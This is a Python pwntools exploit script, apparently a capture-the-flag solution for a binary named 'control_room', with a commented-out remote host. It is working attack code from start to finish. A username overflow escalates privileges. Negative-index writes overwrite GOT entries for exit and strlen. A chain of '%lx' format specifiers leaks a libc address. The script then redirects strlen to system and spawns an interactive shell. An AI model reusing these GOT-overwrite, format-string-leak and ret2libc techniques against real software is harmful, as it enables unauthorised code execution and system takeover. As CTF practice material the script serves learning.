from pwn import *
context.arch = "amd64"
# context.log_level = "debug"

io = process("./control_room")
# io = remote('68.183.37.122', 30173)
elf = ELF("./control_room")
libc = ELF('./libc.so.6')
rop = ROP(elf)
gdbscript="""
b user_edit
c
"""
# gdb.attach(io, gdbscript=gdbscript)

# get captain
io.sendlineafter(b'username: ', b'A'*256)
io.sendlineafter(b'size', b'256')
io.sendlineafter(b'new username: ', b'A'*254)

# get technician
io.sendline(b'5')
io.sendline(b'1')


# allocate got of exit
io.sendline(b'1')
io.sendline(b'-7')

io.sendline(str(elf.sym['main']).encode())  # replacing exit with main
io.sendline(str(elf.sym['printf']).encode()) # replacing null with printf
io.sendline(b'y')



# allocate got of strlen
io.sendline(b'1')
io.sendline(b'-14')

io.sendline(str(elf.sym['printf']).encode())  # replacing strlen with puts
io.sendline(str(elf.sym['printf']).encode()) # replacing stk_chk_fail with printf
io.sendline(b'y')

# restarting main
io.sendlineafter(b'Option [1-5]:', b'12')
io.clean()
payload = b'%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-'
payload += b'%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-'
payload += b'%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-'
io.sendline(payload.ljust(256, b'A'))
# io.recvuntil(b'Register ]===>\n\n')
# io.recvuntil(b'username: ')


# log.info(f"found libc leak: {io.recvline()}")

leak = int(io.recvline().split(b'-')[56], 16)
log.info(f"found libc leak: {hex(leak)}")
libc.address = leak - 0x29d90
log.info(f"found libc base: {hex(libc.address)}")
io.sendlineafter(b'size', b'1')
# io.sendline()

# restarting main
io.sendline(b'12')
io.sendlineafter(b'username: ', b'A'*256)
io.sendlineafter(b'size', b'256')
io.sendlineafter(b'new username: ', b'A'*254)

# get technician
io.sendline(b'5')
io.sendline(b'1')

# allocate got of strlen
io.sendline(b'1')
io.sendline(b'-14')

io.sendline(str(libc.sym['system']+0xa).encode())  # replacing strlen with puts
io.sendline(str(elf.sym['printf']).encode()) # replacing stk_chk_fail with printf
io.sendline(b'y')

# restarting main
io.sendlineafter(b'Option [1-5]:', b'12')
io.clean()
payload = b'Sh'
io.sendline(payload)


io.interactive()